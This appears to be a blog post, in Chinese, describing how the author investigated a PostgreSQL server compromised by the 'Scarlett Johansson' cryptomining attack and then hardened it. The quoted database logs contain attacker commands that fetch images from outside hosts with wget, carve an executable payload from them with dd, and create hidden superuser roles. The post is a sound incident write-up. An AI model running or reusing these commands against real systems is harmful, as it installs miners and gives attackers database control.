@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>记一次 postgresql 斯嘉丽约翰逊攻击的排查 - LexusLee&#39;s blog</title><meta name="Description" content="LexusLee personal blog, recording things you people wouldn&#39;t believe. Like attack ships on fire off the shoulder of Orion, c-beams glitter in the dark near the Tannhauser Gate."><meta property="og:title" content="记一次 postgresql 斯嘉丽约翰逊攻击的排查" />
+<meta property="og:description" content="背景
+今天下午连续收到了腾讯云 CPU overload 报警
+
+登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/scarllet-sql-attack/" />
+<meta property="og:image" content="https://example.com/logo.png"/>
+<meta property="article:published_time" content="2018-08-11T22:49:52+00:00" />
+<meta property="article:modified_time" content="2020-07-14T02:57:28+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="记一次 postgresql 斯嘉丽约翰逊攻击的排查"/>
+<meta name="twitter:description" content="背景
+今天下午连续收到了腾讯云 CPU overload 报警
+
+登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。
+"/>
+<meta name="application-name" content="Nice to meet you">
+<meta name="apple-mobile-web-app-title" content="Nice to meet you"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/scarllet-sql-attack/" /><link rel="prev" href="https://example.com/service-fallback/" /><link rel="next" href="https://example.com/k8s-service-endpoints/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "记一次 postgresql 斯嘉丽约翰逊攻击的排查",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/scarllet-sql-attack\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "Security, Linux, Postgresql","wordcount":  1278 ,
+        "url": "https:\/\/example.com\/scarllet-sql-attack\/","datePublished": "2018-08-11T22:49:52+00:00","dateModified": "2020-07-14T02:57:28+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "LexusLee","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  552 ,
+                    "height":  608 
+                }},"author": {
+                "@type": "Person",
+                "name": "LexusLee"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="LexusLee&#39;s blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Nice to meet you</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/documentation/"> Docs </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/thehackercat" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/scarllet-sql-attack/" selected>English</option><option value="/zh-cn/scarllet-sql-attack/">简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="LexusLee&#39;s blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Nice to meet you</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/documentation/" title="">Docs</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/thehackercat" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/scarllet-sql-attack/" selected>English</option><option value="/zh-cn/scarllet-sql-attack/">简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">记一次 postgresql 斯嘉丽约翰逊攻击的排查</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>LexusLee</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw"></i>Security</a>&nbsp;<a href="/categories/linux/"><i class="far fa-folder fa-fw"></i>Linux</a>&nbsp;<a href="/categories/code/"><i class="far fa-folder fa-fw"></i>Code</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2018-08-11">2018-08-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1278 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#背景">背景</a></li>
+        <li><a href="#排查">排查</a></li>
+        <li><a href="#反思">反思</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h3 id="背景">背景</h3>
+<p>今天下午连续收到了腾讯云 CPU overload 报警</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png"
+        data-srcset="http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png, http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png 1.5x, http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png 2x"
+        data-sizes="auto"
+        alt="http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png"
+        title="CPU Usage" /></p>
+<p>登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png"
+        data-srcset="http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png, http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png 1.5x, http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png 2x"
+        data-sizes="auto"
+        alt="http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png"
+        title="Htop info" /></p>
+<h3 id="排查">排查</h3>
+<p>于是根据 pid 到 <code>/proc/20619/stack</code> 下看到有一长串的 <code>[&lt;ffffffff81841ff2&gt;] entry_SYSCALL_64_fastpath+0x16/0x71</code> ，似乎短时间里发起大量的系统调用(prepare)并且还在不断增长。</p>
+<p>接着 <code>cat /proc/20619/cmdline</code> 发现执行的是 <code>/var/lib/postgresql/9.5/main/Ac2p018-0</code> 这个坏家伙，查看发现这是个二进制文件，看不出问题，猜测和 postgresql 数据库有关，看起来不像是什么数据库维护脚本，第一反应是被数据库攻击了，于是查看 <code>/var/lib/postgresql/.bash_history</code> 和 <code>/var/lib/postgresql/.psql_history</code> 发现一条记录都没，显然是被手动清空了，更加确定是被 hack 了。担心已经被拿到 root 权限了，于是通过 <code>lastlog</code> 和 <code>last</code> 查看登录状态，所幸之前的 root 账户的 ip 都是我自己的，只有 postgres 这个账户看起来异常。</p>
+<p>接着到 <code>/var/lib/postgresql/9.5/main/pg_log</code> 下查看数据库日志，抓到了几个奇怪的地方：</p>
+<ol>
+<li>有一个长连接持续从 <code>http://aluka.info/x6</code> 下载文件，</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">5144 --2018-08-11 15:47:30--  http://aluka.info/x6
+5145 Resolving aluka.info (aluka.info)... 103.27.110.206
+5146 Connecting to aluka.info (aluka.info)|103.27.110.206|:80... connected.
+5147 HTTP request sent, awaiting response... 200 OK
+5148 Length: 2758655 (2.6M)
+5149 Saving to: ‘xmm’
+5150
+5151      0K .......... .......... .......... .......... ..........  1%  399K 7s
+5152     50K .......... .......... .......... .......... ..........  3%  601K 5s
+5153    100K .......... .......... .......... .......... ..........  5%  592K 5s
+5154    150K .......... .......... .......... .......... ..........  7% 1.69M 4s
+5155    200K .......... .......... .......... .......... ..........  9%  754K 4s
+5156    250K .......... .......... .......... .......... .......... 11%  422K 4s
+5157    300K .......... .......... .......... .......... .......... 12%  405K 4s
+5158    350K .......... .......... .......... .......... .......... 14%  179K 5s
+5159    400K .......... .......... .......... .......... .......... 16% 81.1K 8s
+5160    450K .......... .......... .......... .......... .......... 18% 35.1K 13s
+5161    500K .......... .......... .......... .......... .......... 20%  117K 13s
+5162    550K .......... .......... .......... .......... .......... 22% 86.3K 14s
+5163    600K .......... .......... .......... .......... .......... 24%  122K 14s
+5164    650K .......... .......... .......... .......... .......... 25%  169K 13s
+5165    700K .......... .......... .......... .......... .......... 27%  171K 13s
+5166    750K .......... .......... .......... .......... .......... 29% 93.8K 13s
+5167    800K .......... .......... .......... .......... .......... 31% 94.9K 13s
+5168    850K .......... .......... .......... .......... .......... 33%  101K 13s
+5169    900K .......... .......... .......... .......... .......... 35% 53.6K 14s
+5170    950K .......... .......... .......... .......... .......... 37% 94.3K 14s
+5171   1000K .......... .......... .......... .......... .......... 38% 77.0K 13s
+5172   1050K .......... .......... .......... .......... .......... 40% 73.6K 13s
+5173   1100K .......... .......... .......... .......... .......... 42% 97.2K 13s
+5174   1150K .......... .......... .......... .......... .......... 44%  130K 13s
+5175   1200K .......... .......... .......... .......... .......... 46%  194K 12s
+5176   1250K .......... .......... .......... .......... .......... 48%  173K 12s
+5177   1300K .......... .......... .......... .......... .......... 50%  109K 11s
+5178   1350K .......... .......... .......... .......... .......... 51% 82.9K 11s
+5179   1400K .......... .......... .......... .......... .......... 53%  134K 10s
+5180   1450K .......... .......... .......... .......... .......... 55%  106K 10s
+5181   1500K .......... .......... .......... .......... .......... 57%  188K 10s
+5182   1550K .......... .......... .......... .......... .......... 59% 51.4K 9s
+5183   1600K .......... .......... .......... .......... .......... 61% 54.6K 9s
+5184   1650K .......... .......... .......... .......... .......... 63% 86.8K 9s
+5185   1700K .......... .......... .......... .......... .......... 64%  160K 8s
+5186   1750K .......... .......... .......... .......... .......... 66% 97.9K 8s
+5187   1800K .......... .......... .......... .......... .......... 68%  153K 8s
+5188   1850K .......... .......... .......... .......... .......... 70%  127K 7s
+5189   1900K .......... .......... .......... .......... .......... 72%  117K 7s
+5190   1950K .......... .......... .......... .......... .......... 74% 63.8K 6s
+5191   2000K .......... .......... .......... .......... .......... 76%  119K 6s
+5192   2050K .......... .......... .......... .......... .......... 77% 67.1K 5s
+5193   2100K .......... .......... .......... .......... .......... 79% 98.0K 5s
+5194   2150K .......... .......... .......... .......... .......... 81%  127K 5s
+5195   2200K .......... .......... .......... .......... .......... 83%  105K 4s
+5196   2250K .......... .......... .......... .......... .......... 85% 99.6K 4s
+5197   2300K .......... .......... .......... .......... .......... 87% 76.9K 3s
+5198   2350K .......... .......... .......... .......... .......... 89%  162K 3s
+5199   2400K .......... .......... .......... .......... .......... 90%  153K 2s
+5200   2450K .......... .......... .......... .......... .......... 92%  239K 2s
+5201   2500K .......... .......... .......... .......... .......... 94%  160K 1s
+5202   2550K .......... .......... .......... .......... .......... 96%  191K 1s
+5203   2600K .......... .......... .......... .......... .......... 98%  118K 0s
+5204   2650K .......... .......... .......... .......... ...       100% 82.4K=24s
+5205
+5206 2018-08-11 15:47:54 (111 KB/s) - ‘xmm’ saved [2758655/2758655]
+5207
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>发现更早的日志里，有两个连接从 <code>img1.imagehousing.com</code> 下载了两张图片, 并成功设置了 777 权限</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback"> 23 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b524, ...
+ 24 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.
+ 25 HTTP request sent, awaiting response... 200 OK
+ 26 Length: 1571 (1.5K) [image/png]
+ 27 Saving to: ‘./conf1.dat’
+ 28
+ 29      0K .                                                     100%  368M=0s
+ 30
+ 31 2018-08-05 12:54:26 (368 MB/s) - ‘./conf1.dat’ saved [1571/1571]
+ 32
+ 33 896+0 records in
+ 34 896+0 records out
+ 35 896 bytes copied, 0.000933778 s, 960 kB/s
+ 36 chmod: cannot access &#39;./x4064410502&#39;: No such file or directory
+ 37 2018-08-05 12:54:26 CST [24806-14] pgsql@postgres LOG:  duration: 810.107 ms  statement: select fun6404402637 (&#39;wget  -c  http://img1.imagehousing.com/0/baby-942650.png -O ./conf1.dat;dd  skip=675  bs=1  if=./conf1.dat  of=config.json  ;rm -f ./conf1#
+ 38 --2018-08-05 12:54:27--  http://img1.imagehousing.com/0/cat-497532.png
+ 39 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b424, ...
+ 40 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.
+ 41 HTTP request sent, awaiting response... 200 OK
+ 42 Length: 840464 (821K) [image/png]
+ 43 Saving to: ‘ifzsvasg.jpg’
+ 44
+ 45      0K .......... .......... .......... .......... ..........  6% 81.3K 9s
+ 46     50K .......... .......... .......... .......... .......... 12%  153K 7s
+ 47    100K .......... .......... .......... .......... .......... 18% 86.2K 7s
+ 48    150K .......... .......... .......... .......... .......... 24%  635K 5s
+ 49    200K .......... .......... .......... .......... .......... 30%  138K 4s
+ 50    250K .......... .......... .......... .......... .......... 36%  139K 4s
+ 51    300K .......... .......... .......... .......... .......... 42%  146K 4s
+ 52    350K .......... .......... .......... .......... .......... 48%  176K 3s
+ 53    400K .......... .......... .......... .......... .......... 54%  194K 3s
+ 54    450K .......... .......... .......... .......... .......... 60%  189K 2s
+ 55    500K .......... .......... .......... .......... .......... 67%  179K 2s
+ 56    550K .......... .......... .......... .......... .......... 73%  178K 1s
+ 57    600K .......... .......... .......... .......... .......... 79%  187K 1s
+ 58    650K .......... .......... .......... .......... .......... 85%  191K 1s
+ 59    700K .......... .......... .......... .......... .......... 91%  132K 0s
+ 60    750K .......... .......... .......... .......... .......... 97%  202K 0s
+ 61    800K .......... ..........                                 100%  141K=5.3s
+ 62
+ 63 2018-08-05 12:54:33 (154 KB/s) - ‘ifzsvasg.jpg’ saved [840464/840464]
+ ...
+</code></pre></td></tr></table>
+</div>
+</div><p>不禁很好奇是怎么做到的，但是又不敢把这两张图片 scp 到本地，于是起了个静态文件 serve 看了下这两张图片表面上看起来竟然是斯嘉丽约翰逊的大头照(流口水!)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://www.4hou.com/uploads/20180318/1521342249300199.png"
+        data-srcset="http://www.4hou.com/uploads/20180318/1521342249300199.png, http://www.4hou.com/uploads/20180318/1521342249300199.png 1.5x, http://www.4hou.com/uploads/20180318/1521342249300199.png 2x"
+        data-sizes="auto"
+        alt="http://www.4hou.com/uploads/20180318/1521342249300199.png"
+        title="Scalet Jown" /></p>
+<p>印象里面 jpg/jpeg 图片似乎有种隐写 payload 的方法，早年作为葫芦娃种子来传播，网上查到 metaspolit 的这个<a href="https://github.com/r00t-3xp10it/FakeImageExploiter" target="_blank" rel="noopener noreffer">组件</a>似乎可以实现。同时也找到了这个工具 <a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener noreffer">strgdetext</a> 用来提取图片中的隐写数据，可惜提取出来后仍是一段看不懂二进制码，于是思路阻塞住了。</p>
+<p>想到既然需要提取 payload, 那么数据库日志里肯定也有相应代码来做这一步，于是重新翻了下日志，果不其然，发现了真正攻击的这一步在这儿</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback"> 68 2018-08-05 12:54:34 CST [24806-15] pgsql@postgres LOG:  duration: 6705.657 ms  statement: select fun6404402637(&#39;wget  -c   http://img1.imagehousing.com/0/cat-497532.png -O ifzsvasg.jpg;dd  skip=20656  bs=1  if=./ifzsvasg.jpg  of=x4064410502;rm -f ./i#
+ 69 2018-08-05 12:54:34 CST [24845-1] postgres@postgres FATAL:  password authentication failed for user &#34;postgres&#34;
+ 70 2018-08-05 12:54:34 CST [24845-2] postgres@postgres DETAIL:  Connection matched pg_hba.conf line 101: &#34;host    all             all              0.0.0.0/0              md5&#34;
+ 71 2018-08-05 12:54:35 CST [24806-16] pgsql@postgres ERROR:  role &#34;login&#34; already exists
+ 72 2018-08-05 12:54:35 CST [24806-17] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &#39;md51351dbb7fe95c1f277282bc842cb3d6b&#39; SUPERUSER CREATEDB CREATEROLE REPLICATION   VALID UNTIL &#39;infinity&#39;;
+ 73 2018-08-05 12:54:36 CST [24806-18] pgsql@postgres ERROR:  role &#34;login&#34; already exists
+ 74 2018-08-05 12:54:36 CST [24806-19] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &#39;md51351dbb7fe95c1f277282bc842cb3d6b&#39; SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &#39;infinity&#39;;
+ 75 2018-08-05 12:54:36 CST [24806-21] pgsql@postgres STATEMENT:  CREATE ROLE pgsql LOGIN ENCRYPTED PASSWORD &#39;md56413b16b3d0861a1d2538e8d5a5eb39c&#39;  SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &#39;infinity&#39;;
+</code></pre></td></tr></table>
+</div>
+</div><p>通过 <code>select tmp_function(cmd) </code> 的方式 执行了 下载图片 &ndash; 提取 paylod &ndash; 设置权限 &ndash; 删除图片 &ndash; 通过 payload 里的自定义代码重建了 pgsql 数据库账户 &ndash; 拿到数据库 root 权限 这一套组合拳，漂亮！</p>
+<p>排查到问题之后，赶紧清空了相关文件和 dbuser，设置了 postgres superuser 本地连接的设置，禁掉了 superuser 网络连接, 翻了下斯嘉丽约翰逊的其他照片，终于长舒一口气。</p>
+<p>回想起来，看看是否有其他人也遇到了「斯嘉丽攻击」, 一查发现果然果然不只我一人中招，不过看了下 <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreffer">exploit db</a> 里还没记录这个漏洞，对比了下时间，似乎是18年初才兴起的。</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/2158" target="_blank" rel="noopener noreffer">通过Scarlett Johansson的照片令Postgre数据库开启门罗币挖矿之旅</a></li>
+<li><a href="http://www.btc112.com/Monero/21066.html" target="_blank" rel="noopener noreffer">斯嘉丽门罗币攻击</a></li>
+</ul>
+<h3 id="反思">反思</h3>
+<p>这次主要的原因是 postgres 配置权限时偷懒导致服务器变成挖矿僵尸。</p>
+<ol>
+<li>postgres <code>pg_hba.conf</code> 里的用户认证 method 应改成 md5 方式</li>
+<li>数据库 superuser 只配置只能 local 访问禁止远程访问</li>
+<li>腾讯云安全组里数据库端口 outbound 应尽量限制 ip 段</li>
+</ol></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-07-14&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/0b8dc806dec6578f1ff9edd4106e8e937b3406a4" target="_blank" title="commit by Lexus Lee(lexuscyborg103@gmail.com) 0b8dc806dec6578f1ff9edd4106e8e937b3406a4: init hugo source codes">
+                                    <i class="fas fa-hashtag fa-fw"></i>0b8dc80</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/scarllet-sql-attack/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://example.com/scarllet-sql-attack/" data-title="记一次 postgresql 斯嘉丽约翰逊攻击的排查" data-via="lexuscyborg103" data-hashtags="Security,Linux,Postgresql"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://example.com/scarllet-sql-attack/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://example.com/scarllet-sql-attack/" data-title="记一次 postgresql 斯嘉丽约翰逊攻击的排查" data-ralateuid="thehackercat"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://example.com/scarllet-sql-attack/" data-title="记一次 postgresql 斯嘉丽约翰逊攻击的排查"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/security/">Security</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/postgresql/">Postgresql</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/service-fallback/" class="prev" rel="prev" title="坦率地讲 服务熔断 &amp; 服务降级"><i class="fas fa-angle-left fa-fw"></i>坦率地讲 服务熔断 &amp; 服务降级</a>
+            <a href="/k8s-service-endpoints/" class="next" rel="next" title="浅谈 k8s service&amp;kube-proxy">浅谈 k8s service&amp;kube-proxy<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.73.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">LexusLee</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
